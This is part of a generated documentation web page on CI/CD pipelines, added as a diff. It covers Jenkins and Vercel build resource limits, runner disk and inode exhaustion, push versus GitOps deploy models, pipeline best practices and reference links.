+<p>Jenkins has no per-job limits of its own. Control comes from three places:</p>
+<ul>
+<li><strong>Executors per agent</strong> — how many jobs run concurrently on one machine. Set it to the core count, not higher.</li>
+<li><strong>Docker agent args</strong> — <code>agent { docker { image 'node:22'; args '--memory=4g --cpus=2' } }</code>.</li>
+<li><strong>Kubernetes plugin pod templates</strong> — real requests/limits, the same as any pod.</li>
+</ul>
+<p>Never run builds on the controller. One runaway job takes down Jenkins itself.</p>
+<h3 id="vercel-pick-a-machine">Vercel — pick a machine<a class="headerlink" href="#vercel-pick-a-machine" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Machine</th>
+<th style="text-align: center;">vCPU</th>
+<th style="text-align: center;">Memory</th>
+<th style="text-align: center;">Disk</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Standard</td>
+<td style="text-align: center;">2–4</td>
+<td style="text-align: center;">8 GB</td>
+<td style="text-align: center;">32 GB</td>
+</tr>
+<tr>
+<td>Enhanced</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;">16 GB</td>
+<td style="text-align: center;">64 GB</td>
+</tr>
+<tr>
+<td>Turbo</td>
+<td style="text-align: center;">30</td>
+<td style="text-align: center;">60 GB</td>
+<td style="text-align: center;">64 GB</td>
+</tr>
+</tbody>
+</table>
+<p>Plus fixed limits: <strong>45-minute build timeout</strong>, <strong>1 GB build cache</strong> retained one month, and a per-plan cap on concurrent builds. Elastic machines auto-size and bill per CPU-minute.</p>
+<h3 id="disk-and-inodes">Disk and inodes<a class="headerlink" href="#disk-and-inodes" title="Permanent link">&para;</a></h3>
+<p>Nobody documents this and it is the most common self-hosted runner failure: <strong>runners fill up</strong>. Docker layers, node_modules, and caches accumulate across jobs on a long-lived machine, and the failure is often inode exhaustion rather than bytes — <code>df -h</code> looks fine while every build fails.</p>
+<div class="highlight"><pre><span></span><code>df<span class="w"> </span>-h<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>df<span class="w"> </span>-i<span class="w">                     </span><span class="c1"># check both</span>
+docker<span class="w"> </span>system<span class="w"> </span>prune<span class="w"> </span>-af<span class="w"> </span>--volumes<span class="w">  </span><span class="c1"># on a schedule, not after the outage</span>
+</code></pre></div>
+<p>See <a href="../server_operations/#6-disk-the-three-ways-it-fills-up">Running a Server §6</a> for the full diagnosis. Ephemeral runners (fresh VM or pod per job) make the problem disappear entirely — prefer them.</p>
+<hr />
+<h2 id="6-how-the-deploy-actually-happens">6. How the Deploy Actually Happens<a class="headerlink" href="#6-how-the-deploy-actually-happens" title="Permanent link">&para;</a></h2>
+<p>Two models, and it is worth knowing which one you are in:</p>
+<pre class="mermaid"><code>flowchart LR
+    B[CI job builds artifact] --&gt; R[Registry or artifact store]
+    R --&gt; P[Push: CI connects out and applies]
+    R --&gt; G[Pull: agent in cluster watches registry]
+    P --&gt; T[Target: server, k8s, CDN]
+    G --&gt; T</code></pre>
+<ul>
+<li><strong>Push deploy</strong> — the CI job holds production credentials and runs <code>ssh</code>, <code>kubectl apply</code>, <code>helm upgrade</code>, or <code>docker compose up</code>. Simple; your CI system becomes a high-value target.</li>
+<li><strong>Pull deploy (GitOps)</strong> — an agent inside the target environment watches a repo or registry and reconciles. CI never holds production credentials. More moving parts, much better blast radius.</li>
+</ul>
+<p>Vercel is a third model again: build output goes straight to its own edge network and CDN. Every deploy is immutable and independently addressable, so <strong>rollback is repointing an alias</strong>, not rebuilding.</p>
+<hr />
+<h2 id="7-best-practices">7. Best Practices<a class="headerlink" href="#7-best-practices" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Pipeline fails fast and cheap.</strong> Lint and unit tests first, integration and builds after. Do not wait ten minutes to learn a formatting error.</li>
+<li><strong>Pin action and image versions.</strong> <code>actions/checkout@v4</code>, <code>python:3.12</code> — not <code>latest</code>. Better still, pin actions by commit SHA; tags are mutable.</li>
+<li><strong>Cache dependencies, not build output.</strong> Restore <code>~/.cache/pip</code> or <code>node_modules</code>; rebuilding artifacts from a stale cache produces mysteries.</li>
+<li><strong>One job, one responsibility.</strong> Parallelise across jobs and let the platform schedule them.</li>
+<li><strong>Make the pipeline runnable locally.</strong> If CI runs <code>make test</code>, you can run <code>make test</code>. Debugging by pushing commits is the slowest loop in software.</li>
+<li><strong>Set a timeout on every job.</strong> The default is generous and a hung job burns minutes until it hits it.</li>
+<li><strong>Protect the production branch.</strong> Required reviews, required status checks, no direct pushes — see <a href="../../basics/lifecycle/#version-control">Lifecycle → Version Control</a>.</li>
+<li><strong>Keep secrets out of forks and PRs from untrusted sources.</strong></li>
+<li><strong>Make deploys idempotent and reversible.</strong> Re-running should be safe; rolling back should not require a rebuild.</li>
+</ul>
+<hr />
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>GitLab</strong> — <a href="https://docs.gitlab.com/ci/yaml/">CI/CD YAML reference</a> · <a href="https://docs.gitlab.com/ci/variables/">CI/CD variables</a> · <a href="https://docs.gitlab.com/runner/executors/">Runner executors</a> · <a href="https://docs.gitlab.com/ci/runners/configure_runners/">Configure runners</a> · <a href="https://docs.gitlab.com/ci/pipeline_security/">Pipeline security</a></li>
+<li><strong>GitHub</strong> — <a href="https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions">Workflow syntax</a> · <a href="https://docs.github.com/en/actions/reference/runners/github-hosted-runners">GitHub-hosted runners</a> · <a href="https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions">Secrets</a> · <a href="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions">Security hardening</a></li>
+<li><strong>Jenkins</strong> — <a href="https://www.jenkins.io/doc/book/pipeline/syntax/">Pipeline syntax</a> · <a href="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/">Using a Jenkinsfile</a> · <a href="https://www.jenkins.io/doc/book/using/using-credentials/">Using credentials</a> · <a href="https://www.jenkins.io/doc/book/pipeline/docker/">Docker with Pipeline</a> · <a href="https://plugins.jenkins.io/kubernetes/">Kubernetes plugin</a></li>
+<li><strong>Vercel</strong> — <a href="https://vercel.com/docs/fundamentals/builds">How Vercel builds your application</a> · <a href="https://vercel.com/docs/git">Git deployments</a> · <a href="https://vercel.com/docs/environment-variables">Environment variables</a> · <a href="https://vercel.com/docs/project-configuration">Project configuration</a> · <a href="https://vercel.com/docs/builds/managing-builds">Managing builds</a></li>
+<li><strong>General</strong> — <a href="https://continuousdelivery.com/">Continuous Delivery</a> (Humble &amp; Farley) · <a href="https://12factor.net/">The Twelve-Factor App</a> on config in the environment · <a href="https://openssf.org/">OpenSSF: securing CI/CD</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.tracking", "navigation.indexes", "navigation.sections", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../javascripts/mathjax-init.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
